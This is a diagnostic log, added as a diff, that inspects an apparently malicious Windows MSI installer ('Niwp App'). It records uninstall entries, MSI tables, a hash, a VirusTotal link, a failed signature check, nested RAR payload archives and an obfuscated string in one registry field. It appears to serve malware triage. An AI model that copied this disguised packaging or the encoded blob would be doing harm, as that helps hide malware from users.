@@ -1,0 +1,1447 @@
+======================== MAU Log ========================
+
+Analyzing {70995719-AA9F-40B3-85E9-C46CB738DAAF}...
+----------------------------------------------------------------------------------------------
+                                       UNINSTALL / ARP
+----------------------------------------------------------------------------------------------
+
+  AuthorizedCDFPrefix=
+  Comments=This installer database contains the logic and data required to install Niwp App.
+  Contact=
+  DisplayName=Niwp App
+  DisplayVersion=6.4.8
+  EstimatedSize=179404
+  HelpLink=
+  HelpTelephone=
+  InstallDate=20260929
+  InstallLocation=C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\
+  InstallSource=C:\Users\Redacted\Desktop\038cbe87c4ddb39e7c7accc95d221950d96f2adb0649acaaea60258255c203a6\
+  Language=1033
+  ModifyPath=MsiExec.exe /X{70995719-AA9F-40B3-85E9-C46CB738DAAF}
+  NoModify=1
+  Publisher=Tioao Wesah
+  Readme=
+  Size=
+  UninstallString=MsiExec.exe /X{70995719-AA9F-40B3-85E9-C46CB738DAAF}
+  URLInfoAbout=
+  URLUpdateInfo=
+  Version=100925448
+  VersionMajor=6
+  VersionMinor=4
+  WindowsInstaller=1
+RESOLVED: DisplayName=Niwp App
+RESOLVED: Publisher=Tioao Wesah
+RESOLVED: InstallLocation=C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\
+RESOLVED: LocalPackage=<none>
+----------------------------------------------------------------------------------------------
+                                       INSTALLER BRANCH
+----------------------------------------------------------------------------------------------
+
+  AuthorizedCDFPrefix=
+  Comments=This installer database contains the logic and data required to install Niwp App.
+  Contact=
+  DisplayName=Niwp App
+  DisplayVersion=6.4.8
+  EstimatedSize=179404
+  HelpLink=
+  HelpTelephone=
+  InstallDate=20260929
+  InstallLocation=C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\
+  InstallSource=C:\Users\Redacted\Desktop\038cbe87c4ddb39e7c7accc95d221950d96f2adb0649acaaea60258255c203a6\
+  Language=1033
+  LocalPackage=C:\Windows\Installer\a46df.msi
+  ModifyPath=MsiExec.exe /X{70995719-AA9F-40B3-85E9-C46CB738DAAF}
+  NoModify=1
+  Publisher=Tioao Wesah
+  Readme=
+  Size=
+  UninstallString=MsiExec.exe /X{70995719-AA9F-40B3-85E9-C46CB738DAAF}
+  URLInfoAbout=
+  URLUpdateInfo=
+  Version=100925448
+  VersionMajor=6
+  VersionMinor=4
+  WindowsInstaller=1
+  MainFeature=MiU=T]+78=ZJ)e)We9=JgVb!&ny'5ATJ]U]0T}@ZV_hBU'*ME@NHQxr_r9@@*0vFP@VUo@1.5,IRzA@KrW8Z@L!!i@~FN^Lc2oT+^EGNr=wma9+j1A1d+J-Ixy9Sjm%'_96b*CfLXU?G$~3*FCPLs@BlRa`G,Tq3eUSX(xpk8A1buu%pCKxOL5F8M3Q9n?-Td=33-HDoZ^sJl0yPM9D}*XR[S9('Cqz%RC4L~=EV8ASUxOL0NqH%gBUVM=u4PaliOJy^VqrS?0Ai,@S(}wHrBI]Ms`D@Y_BW*=fTraFh8~{_&7j@deCO2@ate@O*Tnh+-I@ON4Y4W?TO+g__-(bd6?we$qMCk9vPgb(3-%trk3!IHA(^MAf[8I%2,edr*'r7B3Rn`8G&bf%8vc@B,[4ZONkB0?rjb8+2DaOa0t$ZBRy~s?[MdktoK,?NeIK-k[U.l@U8zhbM9Aw3opBXJfLJ`?olDQtydaP,@d8^UU`P{=2l^Mv)5QIg{g`'t5Z]OA6RqMDMgrqf3ku+sKQxI=jJbOD6B3C$,LBXFucRC?pX5%g0M0K+ffOeiM?%$=7YbQh&9Acx]Zlot%E+$@YKh(Ks9n1n4x%N,0y*+?VFB8sAg&ixoXW'YQV1K?t~gl@(`3afFDuQ=Hh`l9p8Xc=dUa6M3(l[A{vo,?IQ!1jVSVvgz=!?%*ep}96[JG3s8cR8.Uaz4'?@X9l[U(SA.S$gLW8x.x4Ac@Kjey.zRE,5C,qJ?LvAo@sp5U3+XV&CTq_JE6]Q_@mj,]Zm6sM'MCrI%fe3p?`^52m)uLkIrXj.acp'4?3e2298b^I$}&o'sg'vm96ja$CQ)HythL%O`&PPY90*10ybD1UdEpws.ujzn9ZRjN8CwWE7U1hCVDw7f?^@(EW4RS0u-@tCNu82b@R.vcRbhO4wQ^9Ce$G%4ATJ3lS0mVUd&?GRXmEj9@ZnN!UE^V2-?NW7wfW?Q90%=o0RZ_5MrgIqP@T+n?G=IT`xR4I.bAjR-g^WE9C2F~(9)-[6pGIUA%nbf=*E6GD{lAukP]KC72qoOAW185?$VVJxshv6-e!Z4=RLX-.SF268npXpdSSk'@w-(g96(X_`-xu'r_$Xv@0qmt`5aEaDcW*J3VDGf9_$%aq_t5aJ$f@5nY,?p?SV+u1P8,BaTEG`fy.bx9$?WmkS[XWmoxbK,Phs=?kcVe0'.7$I^38M5`4U4?.7d-Vhs=rh[bTlw^r15?8JTstRE9Y7nEH!(r!z9@t6n5),?wYz4x0Ym,bzp@i[ItCpo!hyS+Cy1ZRNv@Ct@2_vRL^Sz4Ni7eBzcAHgu$p$ouSe
+  AllPatches=
+RESOLVED: DisplayName=Niwp App
+RESOLVED: Publisher=Tioao Wesah
+RESOLVED: InstallLocation=C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\
+RESOLVED: LocalPackage=C:\Windows\Installer\a46df.msi
+----------------------------------------------------------------------------------------------
+                                    UPGRADECODE MEMBERSHIP
+----------------------------------------------------------------------------------------------
+
+----------------------------------------------------------------------------------------------
+                                    COMPONENT REGISTRATION
+----------------------------------------------------------------------------------------------
+
+----------------------------------------------------------------------------------------------
+                                         MSI DATABASE
+----------------------------------------------------------------------------------------------
+
+Cached MSI:
+  Path: C:\Windows\Installer\a46df.msi
+  SHA256: 038CBE87C4DDB39E7C7ACCC95D221950D96F2ADB0649ACAAEA60258255C203A6
+  Network: Active network connection detected
+  VirusTotal Report: https://www.virustotal.com/gui/file/038CBE87C4DDB39E7C7ACCC95D221950D96F2ADB0649ACAAEA60258255C203A6
+  Sigcheck: Failed
+  Error: Sigcheck returned exit code 1.
+Reading cached MSI: C:\Windows\Installer\a46df.msi
+RESOLVED: DisplayName=Niwp App
+RESOLVED: Publisher=Tioao Wesah
+RESOLVED: InstallLocation=C:\Users\Redacted\AppData\Roaming\Tioao Wesah\Niwp App\
+RESOLVED: LocalPackage=C:\Windows\Installer\a46df.msi
+[Property]
+  DiskPrompt | [1]
+  UpgradeCode | {8F531E0F-A0A1-4694-B62C-4A51F3193748}
+  ButtonText_Continue | &Continue
+  SecureCustomProperties | OLDPRODUCTS;AI_NEWERPRODUCTFOUND
+  AI_BITMAP_DISPLAY_MODE | 0
+
+  WindowsTypeNT40 | Windows NT 4.0
+  AI_ThemeStyle | deep-sea
+  AI_FrameBtns | mediumorchid
+  WindowsTypeNT60Display | Windows Vista/Server 2008
+  PROMPTROLLBACKCOST | P
+  AppsShutdownOption | All
+  REBOOT | ReallySuppress
+  LIMITUI | 1
+  ButtonText_Finish | &Finish
+  Manufacturer | Tioao Wesah
+  AI_FrameColor | deepskyblue
+  AI_ImagesColor | chrome
+  GrinvAqoi | 26727bb
+  AI_SecondColor | pink
+  ButtonText_Yes | &Yes
+  ARPCOMMENTS | This installer database contains the logic and data required to install Niwp App.
+  WindowsTypeNT60 | Windows Vista/Server 2008
+  ARPPRODUCTICON | icon_15.exe
+  ARPNOMODIFY | 1
+  ButtonText_Repair | &Repair
+  AiPreferFastOem | 1
+  ProductLanguage | 1033
+  ProductVersion | 6.4.8
+  CtrlEvtRemoving | Removing
+  ButtonText_No | &No
+  Cevuia | True
+  IdentLoaqi | 373113
+  ButtonText_Abort | &Abort
+  MSIFASTINSTALL | 7
+  ProductCode | {70995719-AA9F-40B3-85E9-C46CB738DAAF}
+  WindowsType9XDisplay | Windows 9x/ME
+  ProductName | Niwp App
+  SraTrim | 851858
+  Background | background.jpg
+  WindowsType9X | Windows 9x/ME
+  ButtonText_Return | &Return
+  WindowsTypeNT40Display | Windows NT 4.0
+  ButtonText_TryAgain | &Try Again
+  WindowsTypeNT50 | Windows 2000
+  WindowsTypeNT50Display | Windows 2000
+  ButtonText_Decline | &Decline
+  WindowsTypeNT5X | Windows XP/2003
+  ButtonText_Remove | &Remove
+  WindowsTypeNT5XDisplay | Windows XP/2003
+  ButtonText_OK | OK
+  ErrorDialog | ErrorDlg
+  INSTALLLEVEL | 3
+  EnableUserControl | 1
+  ButtonText_Browse | Br&owse...
+  ButtonText_Cancel | Cancel
+  ButtonText_Exit | &Exit
+  ButtonText_Accept | &Accept
+  CompleteEx | completeex.ico
+  ButtonText_Ignore | &Ignore
+  ButtonText_Install | &Install
+  ButtonText_Reset | &Reset
+  ButtonText_Resume | &Resume
+  ButtonText_Retry | &Retry
+  CtrlEvtChanging | Changing
+  CtrlEvtRepairing | Repairing
+  CtrlEvtchanges | changes
+  CtrlEvtremoves | removes
+  CtrlEvtrepairs | repairs
+  InstallMode | Typical
+  InstallModeComplete | Complete
+  InstallModeCustom | Custom
+  InstallModeTypical | Typical
+  Setup | Setup
+  Wizard | Setup Wizard
+  Progress1 | Installing
+  Installing | installing.jpg
+  Progress2 | installs
+  AiPrerequisitesColums | PrereqLabel,PrereqReq,PrereqFound,PrereqAction
+  Text_Next | Next
+  ButtonText_Back | < &Back
+  ButtonText_Next | &Next >
+  ButtonText_SelectAll | Select All
+  ButtonText_UnselectAll | Unselect All
+  Text_Install | Install
+  AI_CommitButton | ButtonText_Install
+  DefaultUIFont | Normal
+  InfoIcon | info
+  UpDirIcon | Up
+  NewDirIcon | New
+  TypicalEx | typicalex.ico
+  CustomEx | customex.ico
+  RemoveEx | removeex.ico
+  RepairEx | repairex.ico
+  WhiteBackground | white.jpg
+  WhiteBackgroundSmall | whitesmall.jpg
+  InfoExIcon | infoex.ico
+  MaintenanceTypeOption | Change
+  ExclamationIconEx | exclamation.ico
+  AI_CF_TITLE_TEXT_STYLE | {\CfTitleFont}
+  AI_CF_SYS_BTNS_YPOS | 22
+  AI_CF_SYS_BTNS_SPACING | 0
+  Collecting | collecting.jpg
+  MinBackground | minbackground.jpg
+  Preparing | preparing.jpg
+  Finalizing | finalizing.jpg
+
+  AI_ThemeSteps | radio
+  AI_LOG_CHECKBOX | 1
+  AiWinUIRequestedTheme | Light
+  TabBackground | tabback
+  AI_CURRENT_YEAR | 2024
+  AI_PACKAGING_TOOL | Advanced Installer 22.2 build f1263881
+  AI_BUILD_NAME | DefaultBuild
+  AI_EMBEDDED_FILES_LOCATION | 1
+  AI_BOOTSTRAPPERLANGS | 1033;
+  AI_BOOTSTRAPPERORIGINALLANG | 1033
+  AI_PACKAGE_TYPE | Intel
+  AI_EUIMSI | 1
+[Registry]
+  <none>
+[Class]
+  <none>
+[ProgId]
+  <none>
+[TypeLib]
+  <none>
+[Extension]
+  <none>
+[AppId]
+  <none>
+[Directory]
+  APPDIR | TARGETDIR | APPDIR:.
+  stream_out_Dir | APPDIR | STREAM~1|stream_out
+  TARGETDIR |  | SourceDir
+[Component]
+  APPDIR | {89BA0234-ECD1-4530-8410-DE14A82C9A6A} | APPDIR | 0 | 
+  ProductInformation | {095BE648-CEBF-4E68-A76A-76A3ED057C9C} | APPDIR | 4 | Version
+  chrome_elf.dll | {8CFDFB52-4805-4BC0-83B1-0AE6F0BF8F4B} | APPDIR | 256 | chrome_elf.dll
+  CEPHtmlEngine.exe | {7D965C96-6AC9-4D41-A354-03670BE7C96D} | APPDIR | 256 | CEPHtmlEngine.exe
+  UnRar.exe | {4C833F3A-2BFC-4D04-B58A-F771BA32881A} | APPDIR | 256 | UnRar.exe
+  guhwjvn.rar | {E4896264-3F7D-436B-A486-5E2988920E67} | APPDIR | 0 | guhwjvn.rar
+  Qt5Core.dll | {CBD30E4C-5A55-4351-BA79-C9BED39E5061} | APPDIR | 0 | Qt5Core.dll
+  Qt5Gui.dll | {5D9AE875-E681-4D65-92FD-31ADEF555331} | APPDIR | 0 | Qt5Gui.dll
+  smartgit.exe | {115530A5-BE61-4E8B-A4AB-09092367407C} | APPDIR | 256 | smartgit.exe
+  smartgitc.exe | {73DDEC90-E021-4A18-867E-802FD334D6DA} | APPDIR | 256 | smartgitc.exe
+  smartgitupdater.exe | {D1BD9012-1E4A-42B6-B472-70848C4CA30C} | APPDIR | 256 | smartgitupdater.exe
+  gitbash.exe | {82C988F0-8A69-478A-B7D2-B686B7F8AB26} | APPDIR | 256 | gitbash.exe
+  gitcmd.exe | {C0FE7FE6-40C0-45D3-AFEC-87D27AEFD8A7} | APPDIR | 256 | gitcmd.exe
+  apimswincoresynchl120.dll | {492B020D-DD86-4B07-A5AA-7466FD210A75} | APPDIR | 256 | apimswincoresynchl120.dll
+  apimswincoresysinfol110.dll | {995974E2-3700-44BA-B06B-6C5FD7AE0DAB} | APPDIR | 256 | apimswincoresysinfol110.dll
+  apimswincoretimezonel110.dll | {B87AABCE-F770-4B33-AAD3-3F7ADB2B3A1B} | APPDIR | 256 | apimswincoretimezonel110.dll
+  apimswincoreutill110.dll | {77ABD8B8-2D4F-494A-A3E9-49AA3548A9B9} | APPDIR | 256 | apimswincoreutill110.dll
+  apimswincrtconiol110.dll | {05576550-6233-43C4-9D9D-AB11BBE1E0E5} | APPDIR | 256 | apimswincrtconiol110.dll
+  apimswincrtconvertl110.dll | {64C5D7EA-8719-4F29-8F8B-70077F5751E5} | APPDIR | 256 | apimswincrtconvertl110.dll
+  apimswincrtenvironmentl110.dll | {519F932D-6C1D-4045-AAF1-7A08C1DECC51} | APPDIR | 256 | apimswincrtenvironmentl110.dll
+  apimswincrtfilesysteml110.dll | {7B2E95C9-52DD-4803-9BEE-A519A5B2B0AF} | APPDIR | 256 | apimswincrtfilesysteml110.dll
+  apimswincrtheapl110.dll | {52BA3970-B9D7-4A4E-94E6-CBEB77431477} | APPDIR | 256 | apimswincrtheapl110.dll
+  apimswincrtlocalel110.dll | {CDBBD1E0-8E36-4D21-96DC-B0B3447B8931} | APPDIR | 256 | apimswincrtlocalel110.dll
+  apimswincrtmathl110.dll | {6B8E6195-1C95-4997-9140-DEEAA0BF7D1D} | APPDIR | 256 | apimswincrtmathl110.dll
+  apimswincrtmultibytel110.dll | {8DF64251-4A78-4778-988F-F4F037EA21C2} | APPDIR | 256 | apimswincrtmultibytel110.dll
+  apimswincrtprivatel110.dll | {E98680B6-37A3-4F3C-A939-8158D17176C0} | APPDIR | 256 | apimswincrtprivatel110.dll
+  apimswincrtprocessl110.dll | {E691C977-671A-45B1-B34D-9258BB371B04} | APPDIR | 256 | apimswincrtprocessl110.dll
+  apimswincrtruntimel110.dll | {5F1C42F5-A3CE-4891-B8D0-FCC0F07E2D1A} | APPDIR | 256 | apimswincrtruntimel110.dll
+  apimswincrtstdiol110.dll | {C957CCF9-065D-447D-8D34-8BC5DE3CEFF7} | APPDIR | 256 | apimswincrtstdiol110.dll
+  apimswincrtstringl110.dll | {EBF24862-BAF0-4AB6-ABFC-1B6D5E3831D7} | APPDIR | 256 | apimswincrtstringl110.dll
+  apimswincrttimel110.dll | {1D651424-C37A-47DB-9CAD-FCE6391725F8} | APPDIR | 256 | apimswincrttimel110.dll
+  apimswincoreprofilel110.dll | {98A02042-64A2-48D9-9C3A-274DA41BDABF} | APPDIR | 256 | apimswincoreprofilel110.dll
+  apimswincorertlsupportl110.dll | {45FC0581-DFD6-43D0-833A-9846E315CE73} | APPDIR | 256 | apimswincorertlsupportl110.dll
+  apimswincorestringl110.dll | {4FAE4323-13B5-47EC-B890-B7CADAD0BEC3} | APPDIR | 256 | apimswincorestringl110.dll
+  apimswincoresynchl110.dll | {0710984C-911E-4468-A515-D22F8E5CCA3F} | APPDIR | 256 | apimswincoresynchl110.dll
+  vcruntime140.dll | {34C58F81-5BF4-431B-932B-FE851E43F6C0} | APPDIR | 256 | vcruntime140.dll
+  vcruntime140_1.dll | {252042F1-B97A-4CCE-BF10-2E25CE663C35} | APPDIR | 256 | vcruntime140_1.dll
+  msvcp140.dll | {48D67A81-40AC-4D3F-AE6D-5330A83D2354} | APPDIR | 256 | msvcp140.dll
+  LiteLicuqidExpire | {5B7FAFA1-0D0D-4CAB-9046-7A9DBDF9D40D} | APPDIR | 4 | LiteLicuqidExpire
+  axvlc.dll | {07765B4C-FB22-4A2A-9361-18D431A51B69} | APPDIR | 0 | axvlc.dll
+  libvlccore.dll | {AEAB5599-6368-4826-94B2-DB410CAC5704} | APPDIR | 0 | libvlccore.dll
+  npvlc.dll | {E66B8FC6-9830-43DC-B79F-115432134CEC} | APPDIR | 0 | npvlc.dll
+  libstream_out_autodel_plugin.dll | {AC8E3CC7-8415-4326-B05B-5BF9DEBC39B9} | stream_out_Dir | 0 | libstream_out_autodel_plugin.dll
+  libstream_out_bridge_plugin.dll | {24F7D52B-7C50-43E6-9FAD-A53F74E2323C} | stream_out_Dir | 0 | libstream_out_bridge_plugin.dll
+  libstream_out_chromaprint_plugin.dll | {9023D152-BC9D-49CD-A2B2-4C933DA3ECEC} | stream_out_Dir | 0 | libstream_out_chromaprint_plugin.dll
+  libstream_out_chromecast_plugin.dll | {774101FA-256B-4CC4-B2C7-D58491BE4AF3} | stream_out_Dir | 0 | libstream_out_chromecast_plugin.dll
+  libstream_out_cycle_plugin.dll | {BBAE7EEA-26D7-4E5F-8FD4-3F88526D3DB9} | stream_out_Dir | 0 | libstream_out_cycle_plugin.dll
+  libstream_out_delay_plugin.dll | {96E5E69F-6E67-4B78-AE9A-078CD483A51F} | stream_out_Dir | 0 | libstream_out_delay_plugin.dll
+  libstream_out_description_plugin.dll | {F367B4B1-AF71-42D9-B69A-E8271C80C473} | stream_out_Dir | 0 | libstream_out_description_plugin.dll
+  libstream_out_display_plugin.dll | {7F1B2688-7244-4A17-897D-C0ACF9C17023} | stream_out_Dir | 0 | libstream_out_display_plugin.dll
+  libstream_out_dummy_plugin.dll | {20ADF4CB-E3AC-426B-A810-A512F659E039} | stream_out_Dir | 0 | libstream_out_dummy_plugin.dll
+  libstream_out_duplicate_plugin.dll | {4F7252DD-654B-46B5-B907-4358203C25D0} | stream_out_Dir | 0 | libstream_out_duplicate_plugin.dll
+  libstream_out_es_plugin.dll | {3C1EC959-3AF0-4F3E-9872-31489EAF10F7} | stream_out_Dir | 0 | libstream_out_es_plugin.dll
+  libstream_out_gather_plugin.dll | {1FCE6DEE-D964-450E-ABBF-9C22BD9FE43E} | stream_out_Dir | 0 | libstream_out_gather_plugin.dll
+  libstream_out_mosaic_bridge_plugin.dll | {BA314B0E-4170-4AD9-A870-9C4370D41FAD} | stream_out_Dir | 0 | libstream_out_mosaic_bridge_plugin.dll
+  libstream_out_record_plugin.dll | {E34FCD5E-491C-4D83-8EE8-E6AD528C2E59} | stream_out_Dir | 0 | libstream_out_record_plugin.dll
+  libstream_out_rtp_plugin.dll | {2FEB373D-F55F-4395-9D4E-12E2405CD86B} | stream_out_Dir | 0 | libstream_out_rtp_plugin.dll
+  libstream_out_setid_plugin.dll | {D751CB0C-CBEF-4A2B-92DC-3B2B97AF31AF} | stream_out_Dir | 0 | libstream_out_setid_plugin.dll
+  libstream_out_smem_plugin.dll | {BFD277CC-7A50-4441-B1A2-DCCF510851D5} | stream_out_Dir | 0 | libstream_out_smem_plugin.dll
+  libstream_out_standard_plugin.dll | {1D4F07D2-51D2-4866-9A9D-8D27A495B866} | stream_out_Dir | 0 | libstream_out_standard_plugin.dll
+  libstream_out_stats_plugin.dll | {3641C1A6-D643-482A-8D14-848FDB3EB3C6} | stream_out_Dir | 0 | libstream_out_stats_plugin.dll
+  libstream_out_transcode_plugin.dll | {F52932E1-C0FB-4830-8735-15ECF85EEB3C} | stream_out_Dir | 0 | libstream_out_transcode_plugin.dll
+  jvm.dll | {0F92287B-285B-4B7A-850B-521368C8D9FD} | stream_out_Dir | 256 | jvm.dll
+  oneds.dll | {D55FD758-C552-4D4E-A282-C45628EB37FB} | stream_out_Dir | 256 | oneds.dll
+  icudtl.dat | {2B6363E3-3C7B-4D82-A6EC-89A80FF7BE87} | stream_out_Dir | 0 | icudtl.dat
+  libGLESv2.dll | {3D79CA7A-6DE2-4FF1-A6A1-FADC76834ABC} | stream_out_Dir | 256 | libGLESv2.dll
+[File]
+  chrome_elf.dll | chrome_elf.dll | CHROME~1.DLL|chrome_elf.dll | 1024760 | 88.0.4324.182
+  CEPHtmlEngine.exe | CEPHtmlEngine.exe | CEPHTM~1.EXE|CEPHtmlEngine.exe | 4084984 | 11.2.0.100
+  UnRar.exe | UnRar.exe | UnRar.exe | 506008 | 7.1.0.0
+  guhwjvn.rar | guhwjvn.rar | guhwjvn.rar | 410686 | 
+
+  Qt5Core.dll | Qt5Core.dll | Qt5Core.dll | 7442360 | 5.15.2.0
+  Qt5Gui.dll | Qt5Gui.dll | Qt5Gui.dll | 10025108 | 5.15.2.0
+  smartgit.exe | smartgit.exe | smartgit.exe | 460144 | 0.0.0.0
+  smartgitc.exe | smartgitc.exe | SMARTG~1.EXE|smartgitc.exe | 460144 | 0.0.0.0
+  smartgitupdater.exe | smartgitupdater.exe | SMARTG~2.EXE|smartgit-updater.exe | 148856 | 1.0.0.0
+  gitbash.exe | gitbash.exe | git-bash.exe | 137224 | 2.41.0.3
+  gitcmd.exe | gitcmd.exe | git-cmd.exe | 136696 | 2.41.0.3
+  apimswincoresynchl120.dll | apimswincoresynchl120.dll | API-MS~1.DLL|api-ms-win-core-synch-l1-2-0.dll | 12232 | 10.0.18362.1
+  apimswincoresysinfol110.dll | apimswincoresysinfol110.dll | API-MS~2.DLL|api-ms-win-core-sysinfo-l1-1-0.dll | 12744 | 10.0.18362.1
+  apimswincoretimezonel110.dll | apimswincoretimezonel110.dll | API-MS~3.DLL|api-ms-win-core-timezone-l1-1-0.dll | 12232 | 10.0.18362.1
+  apimswincoreutill110.dll | apimswincoreutill110.dll | API-MS~4.DLL|api-ms-win-core-util-l1-1-0.dll | 11720 | 10.0.18362.1
+  apimswincrtconiol110.dll | apimswincrtconiol110.dll | API-MS~5.DLL|api-ms-win-crt-conio-l1-1-0.dll | 12744 | 10.0.18362.1
+  apimswincrtconvertl110.dll | apimswincrtconvertl110.dll | API-MS~6.DLL|api-ms-win-crt-convert-l1-1-0.dll | 15816 | 10.0.18362.1
+  apimswincrtenvironmentl110.dll | apimswincrtenvironmentl110.dll | API-MS~7.DLL|api-ms-win-crt-environment-l1-1-0.dll | 12232 | 10.0.18362.1
+  apimswincrtfilesysteml110.dll | apimswincrtfilesysteml110.dll | API-MS~8.DLL|api-ms-win-crt-filesystem-l1-1-0.dll | 13768 | 10.0.18362.1
+  apimswincrtheapl110.dll | apimswincrtheapl110.dll | API-MS~9.DLL|api-ms-win-crt-heap-l1-1-0.dll | 12744 | 10.0.18362.1
+  apimswincrtlocalel110.dll | apimswincrtlocalel110.dll | API-M~10.DLL|api-ms-win-crt-locale-l1-1-0.dll | 12232 | 10.0.18362.1
+  apimswincrtmathl110.dll | apimswincrtmathl110.dll | API-M~11.DLL|api-ms-win-crt-math-l1-1-0.dll | 20928 | 10.0.18362.1
+  apimswincrtmultibytel110.dll | apimswincrtmultibytel110.dll | API-M~12.DLL|api-ms-win-crt-multibyte-l1-1-0.dll | 19904 | 10.0.18362.1
+  apimswincrtprivatel110.dll | apimswincrtprivatel110.dll | API-M~13.DLL|api-ms-win-crt-private-l1-1-0.dll | 64456 | 10.0.18362.1
+  apimswincrtprocessl110.dll | apimswincrtprocessl110.dll | API-M~14.DLL|api-ms-win-crt-process-l1-1-0.dll | 12736 | 10.0.18362.1
+  apimswincrtruntimel110.dll | apimswincrtruntimel110.dll | API-M~15.DLL|api-ms-win-crt-runtime-l1-1-0.dll | 16328 | 10.0.18362.1
+  apimswincrtstdiol110.dll | apimswincrtstdiol110.dll | API-M~16.DLL|api-ms-win-crt-stdio-l1-1-0.dll | 17864 | 10.0.18362.1
+  apimswincrtstringl110.dll | apimswincrtstringl110.dll | API-M~17.DLL|api-ms-win-crt-string-l1-1-0.dll | 18368 | 10.0.18362.1
+  apimswincrttimel110.dll | apimswincrttimel110.dll | API-M~18.DLL|api-ms-win-crt-time-l1-1-0.dll | 14280 | 10.0.18362.1
+  apimswincoreprofilel110.dll | apimswincoreprofilel110.dll | API-M~19.DLL|api-ms-win-core-profile-l1-1-0.dll | 11200 | 10.0.18362.1
+  apimswincorertlsupportl110.dll | apimswincorertlsupportl110.dll | API-M~20.DLL|api-ms-win-core-rtlsupport-l1-1-0.dll | 12224 | 10.0.18362.1
+  apimswincorestringl110.dll | apimswincorestringl110.dll | API-M~21.DLL|api-ms-win-core-string-l1-1-0.dll | 11720 | 10.0.18362.1
+  apimswincoresynchl110.dll | apimswincoresynchl110.dll | API-M~22.DLL|api-ms-win-core-synch-l1-1-0.dll | 13760 | 10.0.18362.1
+  vcruntime140.dll | vcruntime140.dll | VCRUNT~1.DLL|vcruntime140.dll | 98224 | 14.29.30139.0
+  vcruntime140_1.dll | vcruntime140_1.dll | VCRUNT~2.DLL|vcruntime140_1.dll | 37256 | 14.29.30139.0
+  msvcp140.dll | msvcp140.dll | msvcp140.dll | 566704 | 14.29.30139.0
+  axvlc.dll | axvlc.dll | axvlc.dll | 1328520 | 3.0.3.0
+  libvlccore.dll | libvlccore.dll | LIBVLC~1.DLL|libvlccore.dll | 2680200 | 3.0.21.0
+  npvlc.dll | npvlc.dll | npvlc.dll | 1141640 | 3.0.3.0
+  libstream_out_autodel_plugin.dll | libstream_out_autodel_plugin.dll | LIBSTR~1.DLL|libstream_out_autodel_plugin.dll | 40840 | 3.0.21.0
+  libstream_out_bridge_plugin.dll | libstream_out_bridge_plugin.dll | LIBSTR~2.DLL|libstream_out_bridge_plugin.dll | 71048 | 3.0.21.0
+  libstream_out_chromaprint_plugin.dll | libstream_out_chromaprint_plugin.dll | LIBSTR~3.DLL|libstream_out_chromaprint_plugin.dll | 1213320 | 3.0.21.0
+  libstream_out_chromecast_plugin.dll | libstream_out_chromecast_plugin.dll | LIBSTR~4.DLL|libstream_out_chromecast_plugin.dll | 1130888 | 3.0.21.0
+  libstream_out_cycle_plugin.dll | libstream_out_cycle_plugin.dll | LIBSTR~5.DLL|libstream_out_cycle_plugin.dll | 42888 | 3.0.21.0
+  libstream_out_delay_plugin.dll | libstream_out_delay_plugin.dll | LIBSTR~6.DLL|libstream_out_delay_plugin.dll | 40328 | 3.0.21.0
+  libstream_out_description_plugin.dll | libstream_out_description_plugin.dll | LIBSTR~7.DLL|libstream_out_description_plugin.dll | 40328 | 3.0.21.0
+  libstream_out_display_plugin.dll | libstream_out_display_plugin.dll | LIBSTR~8.DLL|libstream_out_display_plugin.dll | 40840 | 3.0.21.0
+  libstream_out_dummy_plugin.dll | libstream_out_dummy_plugin.dll | LIBSTR~9.DLL|libstream_out_dummy_plugin.dll | 38280 | 3.0.21.0
+  libstream_out_duplicate_plugin.dll | libstream_out_duplicate_plugin.dll | LIBST~10.DLL|libstream_out_duplicate_plugin.dll | 96648 | 3.0.21.0
+  libstream_out_es_plugin.dll | libstream_out_es_plugin.dll | LIBST~11.DLL|libstream_out_es_plugin.dll | 44424 | 3.0.21.0
+  libstream_out_gather_plugin.dll | libstream_out_gather_plugin.dll | LIBST~12.DLL|libstream_out_gather_plugin.dll | 41352 | 3.0.21.0
+  libstream_out_mosaic_bridge_plugin.dll | libstream_out_mosaic_bridge_plugin.dll | LIBST~13.DLL|libstream_out_mosaic_bridge_plugin.dll | 48520 | 3.0.21.0
+  libstream_out_record_plugin.dll | libstream_out_record_plugin.dll | LIBST~14.DLL|libstream_out_record_plugin.dll | 75656 | 3.0.21.0
+  libstream_out_rtp_plugin.dll | libstream_out_rtp_plugin.dll | LIBST~15.DLL|libstream_out_rtp_plugin.dll | 698248 | 3.0.21.0
+  libstream_out_setid_plugin.dll | libstream_out_setid_plugin.dll | LIBST~16.DLL|libstream_out_setid_plugin.dll | 41864 | 3.0.21.0
+  libstream_out_smem_plugin.dll | libstream_out_smem_plugin.dll | LIBST~17.DLL|libstream_out_smem_plugin.dll | 43912 | 3.0.21.0
+  libstream_out_standard_plugin.dll | libstream_out_standard_plugin.dll | LIBST~18.DLL|libstream_out_standard_plugin.dll | 72072 | 3.0.21.0
+  libstream_out_stats_plugin.dll | libstream_out_stats_plugin.dll | LIBST~19.DLL|libstream_out_stats_plugin.dll | 66440 | 3.0.21.0
+  libstream_out_transcode_plugin.dll | libstream_out_transcode_plugin.dll | LIBST~20.DLL|libstream_out_transcode_plugin.dll | 72072 | 3.0.21.0
+  jvm.dll | jvm.dll | jvm.dll | 11394704 | 15.0.1.0
+  oneds.dll | oneds.dll | oneds.dll | 3298192 | 89.0.774.68
+  icudtl.dat | icudtl.dat | icudtl.dat | 12432416 | 
+  libGLESv2.dll | libGLESv2.dll | LIBGLE~1.DLL|libGLESv2.dll | 4737864 | 2.1.19885.0
+  java.xml.crypto.jmod | guhwjvn.rar | JAVAXM~1.JMO|java.xml.crypto.jmod | 670979 | 
+  Pencil.bmp | guhwjvn.rar | Pencil.bmp | 822 | 
+  ScrollRightFast.bmp | guhwjvn.rar | SCROLL~3.BMP|Scroll Right Fast.bmp | 822 | 
+  InsertRow.bmp | guhwjvn.rar | INSERT~3.BMP|Insert Row.bmp | 822 | 
+  java.logging.jmod | guhwjvn.rar | JAVALO~1.JMO|java.logging.jmod | 113725 | 
+  java.management.jmod | guhwjvn.rar | JAVAMA~1.JMO|java.management.jmod | 896846 | 
+  MoveLeft.bmp | guhwjvn.rar | MOVELE~1.BMP|Move Left.bmp | 822 | 
+  gigjcxobvj.rar | guhwjvn.rar | GIGJCX~1.RAR|gigjcxobvj.rar | 93000000 | 
+  java.net.http.jmod | guhwjvn.rar | JAVANE~1.JMO|java.net.http.jmod | 718964 | 
